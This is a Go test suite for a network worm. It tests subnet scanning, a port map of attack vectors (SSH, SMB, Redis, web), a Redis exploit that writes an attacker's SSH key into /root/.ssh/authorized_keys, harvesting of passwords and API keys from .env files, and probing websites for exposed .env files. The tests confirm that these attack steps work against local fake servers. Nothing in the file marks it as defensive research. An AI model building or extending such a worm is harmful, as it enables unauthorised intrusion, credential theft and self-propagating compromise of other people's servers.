package main

import (
	"bufio"
	"crypto/ed25519"
	"crypto/rand"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/http/httptest"
	"os"
	"strings"
	"sync"
	"testing"

	"golang.org/x/crypto/ssh"
)

func TestParseSubnetsAndHosts(t *testing.T) {
	subs, err := parseSubnets("192.168.1.0/30")
	if err != nil {
		t.Fatal(err)
	}
	if len(subs) != 1 {
		t.Fatalf("subnets = %d", len(subs))
	}
	hosts := enumerateHosts(subs[0])
	if len(hosts) != 2 || hosts[0] != "192.168.1.1" || hosts[1] != "192.168.1.2" {
		t.Fatalf("hosts = %v", hosts)
	}

	subs, err = parseSubnets("10.0.0.0/24")
	if err != nil {
		t.Fatal(err)
	}
	hosts = enumerateHosts(subs[0])
	if len(hosts) != 254 {
		t.Fatalf("/24 hosts = %d", len(hosts))
	}
	for _, h := range hosts {
		if strings.HasSuffix(h, ".0") || strings.HasSuffix(h, ".255") {
			t.Fatalf("network/broadcast leaked: %s", h)
		}
	}

	if _, err := parseSubnets("not-a-cidr"); err == nil {
		t.Fatal("expected parse error")
	}
	if _, err := parseSubnets(",, ,"); err == nil {
		t.Fatal("expected empty error")
	}
}

func TestPortMapCoverage(t *testing.T) {
	for _, vec := range wormPortMap {
		switch vec {
		case "ssh", "smb", "redis", "web":
		default:
			t.Fatalf("port maps to unknown vector %q", vec)
		}
	}
}

// fakeRedis serves a minimal RESP server that acks every command with
// +OK and records the writes.
type fakeRedis struct {
	ln   net.Listener
	mu   sync.Mutex
	logs []string
}

func startFakeRedis(t *testing.T) *fakeRedis {
	t.Helper()
	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	fr := &fakeRedis{ln: ln}
	go fr.serve()
	t.Cleanup(func() { ln.Close() })
	return fr
}

func (f *fakeRedis) serve() {
	for {
		conn, err := f.ln.Accept()
		if err != nil {
			return
		}
		go func(c net.Conn) {
			defer c.Close()
			rd := bufio.NewReader(c)
			for {
				line, err := rd.ReadString('\n')
				if err != nil {
					return
				}
				line = strings.TrimSpace(line)
				if !strings.HasPrefix(line, "*") {
					continue
				}
				var args int
				fmt.Sscanf(line, "*%d", &args)
				var cmd []string
				for i := 0; i < args; i++ {
					hdr, err := rd.ReadString('\n')
					if err != nil {
						return
					}
					var n int
					fmt.Sscanf(strings.TrimSpace(hdr), "$%d", &n)
					payload := make([]byte, n+2)
					if _, err := io.ReadFull(rd, payload); err != nil {
						return
					}
					cmd = append(cmd, string(payload[:n]))
				}
				f.mu.Lock()
				f.logs = append(f.logs, strings.Join(cmd, " "))
				f.mu.Unlock()
				c.Write([]byte("+OK\r\n"))
			}
		}(conn)
	}
}

// TestRedisVectorEndToEnd proves the redis exploit writes the intended
// commands and reports success only after +OK acks.
func TestRedisVectorEndToEnd(t *testing.T) {
	fr := startFakeRedis(t)

	_, priv, _ := ed25519.GenerateKey(rand.Reader)
	signer, err := ssh.NewSignerFromKey(priv)
	if err != nil {
		t.Fatal(err)
	}
	credMu.Lock()
	credKeys = []ssh.Signer{signer}
	credUsers = []string{"root"}
	credMu.Unlock()

	w := &Worm{done: make(chan struct{})}
	host, port, _ := net.SplitHostPort(fr.ln.Addr().String())
	ok, detail := w.exploitRedis(net.JoinHostPort(host, port))
	if !ok {
		t.Fatalf("redis vector failed: %s", detail)
	}

	fr.mu.Lock()
	defer fr.mu.Unlock()
	joined := strings.Join(fr.logs, " | ")
	for _, want := range []string{"CONFIG SET dir /root/.ssh", "CONFIG SET dbfilename authorized_keys", "SAVE"} {
		if !strings.Contains(joined, want) {
			t.Fatalf("redis log missing %q: %s", want, joined)
		}
	}
	if !strings.Contains(joined, "ssh-ed25519 ") {
		t.Fatalf("expected public key in SET: %s", joined)
	}
}

func TestSSHPubkeyLine(t *testing.T) {
	signer := testSigner(t)
	line := sshPubkeyLine(signer)
	if !strings.HasPrefix(line, "ssh-ed25519 ") {
		t.Fatalf("line = %q", line)
	}
}

func TestCredentialHarvestExtract(t *testing.T) {
	credMu.Lock()
	before := len(credPasses)
	credMu.Unlock()

	text := "db_password = \"hunter2secret\"\napi_key: sk-live-1234\nuser=admin"
	dir := t.TempDir()
	path := dir + "/.env"
	if err := os.WriteFile(path, []byte(text), 0o600); err != nil {
		t.Fatal(err)
	}
	w := &Worm{}
	w.extractFromFile(path)

	credMu.Lock()
	defer credMu.Unlock()
	if len(credPasses) <= before {
		t.Fatal("no passwords harvested")
	}
	found := false
	for _, p := range credPasses {
		if p == "hunter2secret" {
			found = true
		}
	}
	if !found {
		t.Fatalf("harvested = %v", credPasses)
	}
}

func TestWebProbeFindsEnv(t *testing.T) {
	mux := http.NewServeMux()
	mux.HandleFunc("/.env", func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
		w.Write([]byte("KEY=value"))
	})
	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusNotFound)
	})
	ts := httptest.NewServer(mux)
	defer ts.Close()

	host, port, _ := net.SplitHostPort(strings.TrimPrefix(ts.URL, "http://"))
	w := &Worm{done: make(chan struct{})}
	ok, detail := w.probeWeb(host, port)
	if ok {
		t.Fatal("web probe must never report exploited")
	}
	if !strings.Contains(detail, "/.env -> 200") {
		t.Fatalf("detail = %q", detail)
	}
}
